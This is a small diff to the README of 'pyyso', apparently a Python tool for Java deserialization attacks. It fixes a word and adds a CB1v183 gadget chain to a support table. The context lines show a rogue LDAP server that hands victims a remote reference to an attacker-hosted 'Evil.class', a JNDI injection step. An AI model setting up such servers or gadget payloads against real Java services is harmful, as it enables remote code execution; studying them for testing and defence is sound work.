@@ -89,7 +89,7 @@ server=pyyso.LdapRemoteRef(javaCodeBase="http://127.0.0.1:8088/", javaFactory="E
 server.run()
 ```
 This will start a LDAP server listening `0.0.0.0:1389 ` 
-and will return a remote reference pointer to `http://127.0.0.1:8088/Evil.class`
+and will return a remote reference point to `http://127.0.0.1:8088/Evil.class`
 
 ### JRMP
 
@@ -139,6 +139,7 @@ For some reasons, part Gadgets support  JRMP or RMI now，which can be enabled b
 | ----------- | ----- | ----------- | ---------- |
 | CC1-CC7     | ✅     | ✅           | ❌          |
 | CB1v192     | ✅     | ✅           | ❌          |
+| CB1v183     | ✅     | ✅           | ❌          |
 | JDK7u21     | ✅     | ✅           | ❌          |
 | beanfactory | ❌     | ❌           | ✅          |
 | others      | ✅     | ❌           | ❌          |
